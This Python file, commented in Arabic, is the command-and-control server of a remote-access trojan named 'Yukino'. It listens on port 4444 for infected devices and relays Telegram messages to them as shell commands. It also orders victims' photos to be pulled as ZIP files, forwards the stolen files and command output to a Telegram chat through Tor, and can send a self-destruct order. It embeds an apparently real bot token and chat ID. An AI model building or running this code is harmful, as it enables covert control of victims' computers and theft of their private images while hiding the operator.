# -*- coding: utf-8 -*-
import telebot, socket, threading, os
from telebot import apihelper # نحتاج هذا السطر للتحكم في البروكسي
from yukino_utils import decrypt_data

# --- الإعدادات ---
TOKEN = "8060120509:AAHUzbeWow9DAGR1zCAr4YjlIXSiemYWd9g"
CHAT_ID = "7706160407"

# --- تفعيل بروتوكول الإخفاء عبر Tor ---
# هذا السطر يخبر البوت أن يمر عبر Tor للوصول لتلجرام
apihelper.proxy = {'https': 'socks5h://127.0.0.1:9150'}

bot = telebot.TeleBot(TOKEN)
active_connections = {}

# --- دالة معالجة الردود (تكملة الكود كما هو...) ---

# --- دالة معالجة الردود (الصور + النصوص) ---
def handle_response(conn, ip):
    while True:
        try:
            # استقبال البيانات (حجم Buffer كبير لاستيعاب الصور)
            data = conn.recv(10485760) 
            if not data: break
            
            # التحقق: هل البيانات هي ملف ZIP (تبدأ بـ PK)؟
            if data.startswith(b'PK\x03\x04'):
                file_name = f"captured_{ip}.zip"
                with open(file_name, "wb") as f:
                    f.write(data)
                
                with open(file_name, "rb") as f:
                    bot.send_document(CHAT_ID, f, caption=f"📸 يوكينو: تم سحب ملف الصور من {ip}")
                os.remove(file_name) # حذف الملف المؤقت من سيرفرك
            
            else:
                # إذا كانت البيانات نصية (رد على أمر Terminal)
                response = data.decode('utf-8', errors='ignore')
                if response.strip():
                    bot.send_message(CHAT_ID, f"🖥️ رد من {ip}:\n`{response}`", parse_mode="Markdown")
        except:
            break
    
    print(f"⚠️ انقطع الاتصال بالجهاز: {ip}")
    if ip in active_connections: del active_connections[ip]

# --- المستمع (Listener) ---
def listener():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(('0.0.0.0', 4444)) 
    s.listen(10)
    print("🚀 Yukino Server Active. Waiting for connections...")
    
    while True:
        conn, addr = s.accept()
        target_ip = addr[0]
        active_connections[target_ip] = conn
        bot.send_message(CHAT_ID, f"⚡ تم رصد اتصال جديد من: {target_ip}")
        
        # تشغيل خيط (Thread) خاص لهذا الجهاز لاستقبال بياناته
        threading.Thread(target=handle_response, args=(conn, target_ip), daemon=True).start()

# --- أوامر البوت (Telegram Commands) ---

@bot.message_handler(commands=['radar'])
def run_radar(message):
    bot.reply_to(message, "📡 يوكينو: جاري فحص الشبكة...")
    # يمكن إضافة كود nmap هنا لاحقاً

@bot.message_handler(func=lambda m: m.text == "📸 سحب الصور")
def snatch_cmd(message):
    for ip, conn in active_connections.items():
        conn.send("SNATCH_IMG".encode())
    bot.reply_to(message, "🚀 جاري سحب الصور من الأجهزة المتصلة...")

@bot.message_handler(func=lambda m: m.text == "💀 تدمير ذاتي")
def kill_cmd(message):
    for ip, conn in active_connections.items():
        conn.send("SELF_DESTRUCT".encode())
    bot.reply_to(message, "⚠️ تم إرسال أمر الانتحار البرمجي ليوكينو.")

@bot.message_handler(func=lambda m: True)
def send_general_cmd(message):
    # إرسال أي نص تكتبه كأمر Terminal للجهاز
    for ip, conn in active_connections.items():
        try:
            conn.send(message.text.encode())
        except:
            pass

# --- التشغيل ---
if __name__ == "__main__":
    threading.Thread(target=listener, daemon=True).start()
    #bot.send_message(CHAT_ID, "🚀 يوكينو: السيرفر بدأ العمل الآن ومستعد يا غالب.")
    bot.infinity_polling(timeout=60, long_polling_timeout=30)